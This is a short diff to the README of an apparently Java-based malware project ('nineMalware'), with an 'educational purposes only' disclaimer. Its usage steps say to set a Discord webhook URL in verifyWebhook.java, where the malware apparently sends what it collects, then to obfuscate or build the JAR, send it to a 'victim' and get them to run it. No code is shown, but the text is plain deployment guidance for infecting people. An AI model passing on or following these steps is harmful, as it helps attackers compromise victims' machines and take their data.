@@ -4,7 +4,7 @@
 <p align="center">For educational purposes 𝗢𝗡𝗟𝗬.
 
 # Requirements
- 1. I guess Java JRE, JVM idk
+ 1. I guess JRE, JVM idk
 
 <br>
 
@@ -16,7 +16,7 @@
 <br>
 
 # How to use
- 1. Set the variable URL found in verifyWebhook.java to your webhook URL.
+ 1. Set the variable URL found in src/me/ferrioz/nineMalware/Connection/Discord/verifyWebhook.java to your webhook URL.
  2. Obfuscate or just build the JAR instantly. Who cares right?
  3. Send the JAR to your victim and somehow make them run it.
 
